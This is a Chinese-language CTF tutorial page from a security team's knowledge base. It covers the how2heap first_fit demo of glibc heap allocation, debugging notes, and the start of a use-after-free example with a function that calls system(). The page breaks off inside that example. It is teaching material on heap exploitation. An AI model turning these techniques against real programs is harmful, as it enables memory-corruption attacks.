<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <title>【PWN】how2heap | 狼组安全团队公开知识库</title>
    <meta name="description" content="">
    <meta name="generator" content="VuePress 1.9.10">
    <link rel="icon" href="/assets/logo.svg">
    <script type="text/javascript" src="/assets/js/push.js"></script>
    <meta name="description" content="致力于打造信息安全乌托邦">
    <meta name="referrer" content="never">
    <meta name="keywords" content="知识库,公开知识库,狼组,狼组安全团队知识库,knowledge">
    <link rel="preload" href="/assets/css/0.styles.5301641e.css" as="style"><link rel="preload" href="/assets/js/app.05a14ce0.js" as="script"><link rel="preload" href="/assets/js/3.1fa04c48.js" as="script"><link rel="preload" href="/assets/js/2.097bd5d2.js" as="script"><link rel="preload" href="/assets/js/1.b4d7d19b.js" as="script"><link rel="preload" href="/assets/js/56.c7a9d427.js" as="script"><link rel="prefetch" href="/assets/js/10.74ec3b85.js"><link rel="prefetch" href="/assets/js/100.4c36f0b9.js"><link rel="prefetch" href="/assets/js/101.6578066d.js"><link rel="prefetch" href="/assets/js/102.2d4d64c8.js"><link rel="prefetch" href="/assets/js/103.07c8555c.js"><link rel="prefetch" href="/assets/js/11.1844cafe.js"><link rel="prefetch" href="/assets/js/12.93167d60.js"><link rel="prefetch" href="/assets/js/13.33cf4c4c.js"><link rel="prefetch" href="/assets/js/14.acb0f8e3.js"><link rel="prefetch" href="/assets/js/15.c1c829e2.js"><link rel="prefetch" href="/assets/js/16.6cc61238.js"><link rel="prefetch" href="/assets/js/17.d6b6ec06.js"><link rel="prefetch" href="/assets/js/18.c9810acb.js"><link rel="prefetch" href="/assets/js/19.2d67fea5.js"><link rel="prefetch" href="/assets/js/20.fd9ead32.js"><link rel="prefetch" href="/assets/js/21.3327d0b9.js"><link rel="prefetch" href="/assets/js/22.4138b57c.js"><link rel="prefetch" href="/assets/js/23.36beed90.js"><link rel="prefetch" href="/assets/js/24.0c36021e.js"><link rel="prefetch" href="/assets/js/25.f5a2ef8e.js"><link rel="prefetch" href="/assets/js/26.39218a7f.js"><link rel="prefetch" href="/assets/js/27.10c54c33.js"><link rel="prefetch" href="/assets/js/28.27370cc6.js"><link rel="prefetch" href="/assets/js/29.13ad23f4.js"><link rel="prefetch" href="/assets/js/30.68012e8b.js"><link rel="prefetch" href="/assets/js/31.5cd6e168.js"><link rel="prefetch" href="/assets/js/32.02c6b9db.js"><link rel="prefetch" href="/assets/js/33.e45d9540.js"><link rel="prefetch" href="/assets/js/34.ab5dcc4d.js"><link rel="prefetch" href="/assets/js/35.b4460b15.js"><link rel="prefetch" href="/assets/js/36.1babaa2f.js"><link rel="prefetch" href="/assets/js/37.35f9ccdd.js"><link rel="prefetch" href="/assets/js/38.0e97b78f.js"><link rel="prefetch" href="/assets/js/39.ee71229c.js"><link rel="prefetch" href="/assets/js/4.a736a969.js"><link rel="prefetch" href="/assets/js/40.a83a8a24.js"><link rel="prefetch" href="/assets/js/41.5d3e08c9.js"><link rel="prefetch" href="/assets/js/42.e071fbb6.js"><link rel="prefetch" href="/assets/js/43.c26a84a1.js"><link rel="prefetch" href="/assets/js/44.f612a0a3.js"><link rel="prefetch" href="/assets/js/45.8f069874.js"><link rel="prefetch" href="/assets/js/46.a862bfb3.js"><link rel="prefetch" href="/assets/js/47.446d245f.js"><link rel="prefetch" href="/assets/js/48.a869d5dd.js"><link rel="prefetch" href="/assets/js/49.026a461f.js"><link rel="prefetch" href="/assets/js/5.bed65b3f.js"><link rel="prefetch" href="/assets/js/50.28342cb6.js"><link rel="prefetch" href="/assets/js/51.fbe96a8e.js"><link rel="prefetch" href="/assets/js/52.ea1f8792.js"><link rel="prefetch" href="/assets/js/53.b3c838ec.js"><link rel="prefetch" href="/assets/js/54.6aac64ec.js"><link rel="prefetch" href="/assets/js/55.66c278d5.js"><link rel="prefetch" href="/assets/js/57.86b59ef5.js"><link rel="prefetch" href="/assets/js/58.ebf95d84.js"><link rel="prefetch" href="/assets/js/59.47877841.js"><link rel="prefetch" href="/assets/js/6.ae5f5ef9.js"><link rel="prefetch" href="/assets/js/60.f2579be0.js"><link rel="prefetch" href="/assets/js/61.dfa4b0e2.js"><link rel="prefetch" href="/assets/js/62.e4e7c412.js"><link rel="prefetch" href="/assets/js/63.e9eaeebb.js"><link rel="prefetch" href="/assets/js/64.b11ae776.js"><link rel="prefetch" href="/assets/js/65.618609a0.js"><link rel="prefetch" href="/assets/js/66.edb6835a.js"><link rel="prefetch" href="/assets/js/67.e576c66f.js"><link rel="prefetch" href="/assets/js/68.8afc64fa.js"><link rel="prefetch" href="/assets/js/69.96f5a837.js"><link rel="prefetch" href="/assets/js/70.e9bd34b3.js"><link rel="prefetch" href="/assets/js/71.d8edc3d3.js"><link rel="prefetch" href="/assets/js/72.8196ee5b.js"><link rel="prefetch" href="/assets/js/73.1cc96015.js"><link rel="prefetch" href="/assets/js/74.8f57adea.js"><link rel="prefetch" href="/assets/js/75.f6ef0076.js"><link rel="prefetch" href="/assets/js/76.3c8774f0.js"><link rel="prefetch" href="/assets/js/77.8fbd8a4b.js"><link rel="prefetch" href="/assets/js/78.20865f8a.js"><link rel="prefetch" href="/assets/js/79.4068c9a4.js"><link rel="prefetch" href="/assets/js/80.01406468.js"><link rel="prefetch" href="/assets/js/81.23c2e6a4.js"><link rel="prefetch" href="/assets/js/82.5b8d0a9a.js"><link rel="prefetch" href="/assets/js/83.e0ee307c.js"><link rel="prefetch" href="/assets/js/84.7626bf9e.js"><link rel="prefetch" href="/assets/js/85.32d767f1.js"><link rel="prefetch" href="/assets/js/86.b0738776.js"><link rel="prefetch" href="/assets/js/87.ab58bc0d.js"><link rel="prefetch" href="/assets/js/88.dab72057.js"><link rel="prefetch" href="/assets/js/89.548263b9.js"><link rel="prefetch" href="/assets/js/9.4501bf34.js"><link rel="prefetch" href="/assets/js/90.9d8ae323.js"><link rel="prefetch" href="/assets/js/91.3a2f9d1b.js"><link rel="prefetch" href="/assets/js/92.e914abca.js"><link rel="prefetch" href="/assets/js/93.027d5802.js"><link rel="prefetch" href="/assets/js/94.e57261e2.js"><link rel="prefetch" href="/assets/js/95.9c12fc30.js"><link rel="prefetch" href="/assets/js/96.af34365b.js"><link rel="prefetch" href="/assets/js/97.db3fdec7.js"><link rel="prefetch" href="/assets/js/98.4defb66a.js"><link rel="prefetch" href="/assets/js/99.d09c72a0.js"><link rel="prefetch" href="/assets/js/vendors~docsearch.810f51a8.js">
    <link rel="stylesheet" href="/assets/css/0.styles.5301641e.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="ant-row"><div class="nav-button"><i aria-label="icon: bars" class="anticon anticon-bars"><svg viewBox="0 0 1024 1024" focusable="false" data-icon="bars" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M912 192H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 284H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 284H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM104 228a56 56 0 1 0 112 0 56 56 0 1 0-112 0zm0 284a56 56 0 1 0 112 0 56 56 0 1 0-112 0zm0 284a56 56 0 1 0 112 0 56 56 0 1 0-112 0z"></path></svg></i> <span></span></div> <div class="ant-col ant-col-xs-24 ant-col-sm-24 ant-col-md-6 ant-col-lg-5 ant-col-xl-5 ant-col-xxl-4"><a href="/" class="router-link-active home-link"><img src="/assets/logo.svg" alt="狼组安全团队公开知识库" class="logo"> <span class="site-name">狼组安全团队公开知识库</span></a> <div class="search-box mobile-search"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div></div> <div class="ant-col ant-col-xs-0 ant-col-sm-0 ant-col-md-18 ant-col-lg-19 ant-col-xl-19 ant-col-xxl-20"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><ul role="menu" id="nav" class="ant-menu ant-menu-horizontal ant-menu-root ant-menu-light"><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-item"><a href="/" class="router-link-active">
          首页
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-item"><a href="/guide/">
          使用指南
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-item"><a href="/knowledge/" class="router-link-active">
          知识库
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-item"><a href="/opensource/">
          开源项目
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="visibility:hidden;position:absolute;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li></ul> <a href="https://github.com/wgpsec" target="_blank" rel="noopener noreferrer" class="repo-link"><i aria-label="icon: github" class="anticon anticon-github"><svg viewBox="64 64 896 896" focusable="false" data-icon="github" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M511.6 76.3C264.3 76.2 64 276.4 64 523.5 64 718.9 189.3 885 363.8 946c23.5 5.9 19.9-10.8 19.9-22.2v-77.5c-135.7 15.9-141.2-73.9-150.3-88.9C215 726 171.5 718 184.5 703c30.9-15.9 62.4 4 98.9 57.9 26.4 39.1 77.9 32.5 104 26 5.7-23.5 17.9-44.5 34.7-60.8-140.6-25.2-199.2-111-199.2-213 0-49.5 16.3-95 48.3-131.7-20.4-60.5 1.9-112.3 4.9-120 58.1-5.2 118.5 41.6 123.2 45.3 33-8.9 70.7-13.6 112.9-13.6 42.4 0 80.2 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.3-43.9 2.9 7.7 24.7 58.3 5.5 118 32.4 36.8 48.9 82.7 48.9 132.3 0 102.2-59 188.1-200 212.9a127.5 127.5 0 0 1 38.1 91v112.5c.8 9 0 17.9 15 17.9 177.1-59.7 304.6-227 304.6-424.1 0-247.2-200.4-447.3-447.5-447.3z"></path></svg></i></a></nav></div></div> <!----></header> <aside class="sidebar"><div><div class="promo"><div id="promo_3"><div class="promo_title">赞助商</div> <button type="button" class="ant-btn ant-btn-primary ant-btn-background-ghost"><span>成为赞助商</span></button></div></div> <div role="separator" id="reset-margin" class="ant-divider ant-divider-horizontal ant-divider-dashed"></div></div> <ul class="sidebar-links"><li><a href="/knowledge/" aria-current="page" title="知识库广告位招租" class="sidebar-link">知识库广告位招租</a></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>CTF</span> <span class="arrow down"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/knowledge/ctf/" aria-current="page" title="分类简介" class="sidebar-link">分类简介</a></li><li><a href="/knowledge/ctf/ctf.html" title="什么是CTF？" class="sidebar-link">什么是CTF？</a></li><li><a href="/knowledge/ctf/xxe.html" title="【WEB】XXE" class="sidebar-link">【WEB】XXE</a></li><li><a href="/knowledge/ctf/ssrf-gopher.html" title="【WEB】ssrf gopher协议" class="sidebar-link">【WEB】ssrf gopher协议</a></li><li><a href="/knowledge/ctf/exec.html" title="【WEB】命令执行" class="sidebar-link">【WEB】命令执行</a></li><li><a href="/knowledge/ctf/PRF.html" title="【WEB】伪随机数" class="sidebar-link">【WEB】伪随机数</a></li><li><a href="/knowledge/ctf/php-serialize.html" title="【WEB】PHP反序列化" class="sidebar-link">【WEB】PHP反序列化</a></li><li><a href="/knowledge/ctf/uploadfile.html" title="【WEB】文件上传" class="sidebar-link">【WEB】文件上传</a></li><li><a href="/knowledge/ctf/deserialize-byte-escape.html" title="【WEB】反序列化字节逃逸" class="sidebar-link">【WEB】反序列化字节逃逸</a></li><li><a href="/knowledge/ctf/bypass-disable-function.html" title="【WEB】bypass-disable-function" class="sidebar-link">【WEB】bypass-disable-function</a></li><li><a href="/knowledge/ctf/JWT.html" title="【WEB】JWT" class="sidebar-link">【WEB】JWT</a></li><li><a href="/knowledge/ctf/js-prototype-chain-pollution.html" title="【WEB】nodejs原型链污染" class="sidebar-link">【WEB】nodejs原型链污染</a></li><li><a href="/knowledge/ctf/JDBC-Unserialize.html" title="【WEB】Java JDBC反序列化" class="sidebar-link">【WEB】Java JDBC反序列化</a></li><li><a href="/knowledge/ctf/SSTI.html" title="【WEB】SSTI" class="sidebar-link">【WEB】SSTI</a></li><li><a href="/knowledge/ctf/CBC.html" title="【CRYPTO】CBC" class="sidebar-link">【CRYPTO】CBC</a></li><li><a href="/knowledge/ctf/Hash-Leng-Extension.html" title="【CRYPTO】哈希长度拓展攻击" class="sidebar-link">【CRYPTO】哈希长度拓展攻击</a></li><li><a href="/knowledge/ctf/RSA.html" title="【CRYPTO】RSA" class="sidebar-link">【CRYPTO】RSA</a></li><li><a href="/knowledge/ctf/Volatility.html" title="【MISC】Volatility取证分析工具" class="sidebar-link">【MISC】Volatility取证分析工具</a></li><li><a href="/knowledge/ctf/ret2text.html" title="【PWN】ret2text" class="sidebar-link">【PWN】ret2text</a></li><li><a href="/knowledge/ctf/ret2shellcode.html" title="【PWN】ret2shellcode" class="sidebar-link">【PWN】ret2shellcode</a></li><li><a href="/knowledge/ctf/ret2syscall.html" title="【PWN】ret2syscall" class="sidebar-link">【PWN】ret2syscall</a></li><li><a href="/knowledge/ctf/re2libc.html" title="【PWN】ret2libc" class="sidebar-link">【PWN】ret2libc</a></li><li><a href="/knowledge/ctf/ret2csu.html" title="【PWN】ret2csu" class="sidebar-link">【PWN】ret2csu</a></li><li><a href="/knowledge/ctf/UPX.html" title="【RE】UPX" class="sidebar-link">【RE】UPX</a></li><li><a href="/knowledge/ctf/basicheap.html" title="【PWN】堆基础" class="sidebar-link">【PWN】堆基础</a></li><li><a href="/knowledge/ctf/how2heap.html" aria-current="page" title="【PWN】how2heap" class="active sidebar-link">【PWN】how2heap</a></li><li><a href="/knowledge/ctf/iofile.html" title="【PWN】iofile" class="sidebar-link">【PWN】iofile</a></li><li><a href="/knowledge/ctf/32264.html" title="【RE】32位调用64位exe程序" class="sidebar-link">【RE】32位调用64位exe程序</a></li><li><a href="/knowledge/ctf/z3.html" title="【RE】z3" class="sidebar-link">【RE】z3</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>基础知识</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>工具手册</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>Web安全</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>攻防对抗</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>代码审计</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li></ul></aside> <main class="page"> <div class="theme-antdocs-content content__default"><p>how2heap是由shellphish团队制作的堆利用教程，介绍了多种堆利用技术，后续系列实验我们就通过这个教程来学习。</p> <h2 id="first-fit">first_fit <a href="#first-fit" class="header-anchor">#</a></h2> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;尽管这个例子没有演示攻击效果，但是它演示了 glibc 的分配机制\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;glibc 使用首次适应算法选择空闲的堆块\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;如果有一个空闲堆块且足够大，那么 malloc 将选择它\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;如果存在 use-after-free 的情况那可以利用这一特性\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;首先申请两个比较大的 chunk\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x512</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> c<span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;第一个 a = malloc(0x512) 在: %p\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;第二个 b = malloc(0x256) 在: %p\n&quot;</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;我们可以继续分配\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;现在我们把 \&quot;AAAAAAAA\&quot; 这个字符串写到 a 那里 \n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">&quot;AAAAAAAA&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;第一次申请的 %p 指向 %s\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;接下来 free 掉第一个...\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;接下来只要我们申请一块小于 0x512 的 chunk，那就会分配到原本 a 那里: %p\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>

    c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;第三次 c = malloc(0x500) 在: %p\n&quot;</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;我们这次往里写一串 \&quot;CCCCCCCC\&quot; 到刚申请的 c 中\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token string">&quot;CCCCCCCC&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;第三次申请的 c %p 指向 %s\n&quot;</span><span class="token punctuation">,</span> c<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;第一次申请的 a %p 指向 %s\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;可以看到，虽然我们刚刚看的是 a 的，但它的内容却是 \&quot;CCCCCCCC\&quot;\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br></div></div><p>这个程序并不展示如何攻击，而是展示glibc的一种分配规则。glibc 使用一种first-fit算法去选择一个free-chunk。如果存在一个free-chunk并且足够大的话，malloc会优先选取这个chunk。这种机制就可以在被利用于use after free(简称 uaf) 的情形中.</p> <p>使用命令<code>gcc -g first_fit.c -o first_fit</code>编译，-g参数会保留代码的文字信息，便于调试。</p> <p>运行一下看看</p> <p><img src="/images/heap/image-20211226155444162.png" alt="image-20211226155444162"></p> <p>程序展示了一个 glibc 堆分配策略，first-fit。在分配内存时，malloc 先到 unsorted bin（或者 fastbins）中查找适合的被 free 的 chunk，如果没有，就会把 unsorted bin 中的所有 chunk 分别放入到所属的 bins 中，然后再去这些 bins 里去寻找适合的 chunk。可以看到第三次 malloc 的地址和第一次相同，即 malloc 找到了第一次 free 掉的 chunk，并把它重新分配。</p> <p>​    下断点，对着源码调试着理解一下</p> <p>​    先是malloc了两次，第一个堆块的内容为“AAAAAAAA”对应0x41414141…，第二个堆块的内容为“BBBBBBBB”，对应0x42424242…。</p> <p><img src="/images/heap/image-20211226155500389.png" alt="image-20211226155500389"></p> <p>然后free了a，这时候a被放到了unsorted bin中。</p> <p><img src="/images/heap/image-20211226155518541.png" alt="image-20211226155518541"></p> <p>​    然后再去申请一个小于free chunk的大小的内存空间，根据first fit就会分配到这里。可以发现，当释放了一块内存之后再去申请一个大小略小的空间，那么glibc倾向于将先前释放的空间重新分配。</p> <p><img src="/images/heap/image-20211226155527427.png" alt="image-20211226155527427"></p> <p>​    加上参数重新编译一个版本：gcc -fsanitize=address -g first_fit.c，会提示有个 use-after-free 漏洞</p> <p><img src="/images/heap/image-20211226155533401.png" alt="image-20211226155533401"></p> <p>​    UAF 漏洞简单来说就是第一次申请的内存释放之后，没有进行内存回收，下次申请的时候还能申请到这一块内存，导致我们可以用以前的内存指针来访问修改过的内存。</p> <p>​    来看一下一个简单的 UAF 的利用的例子。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func_ptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">evil_fuc</span><span class="token punctuation">(</span><span class="token keyword">char</span> command<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">system</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token keyword">char</span> content<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;%s&quot;</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
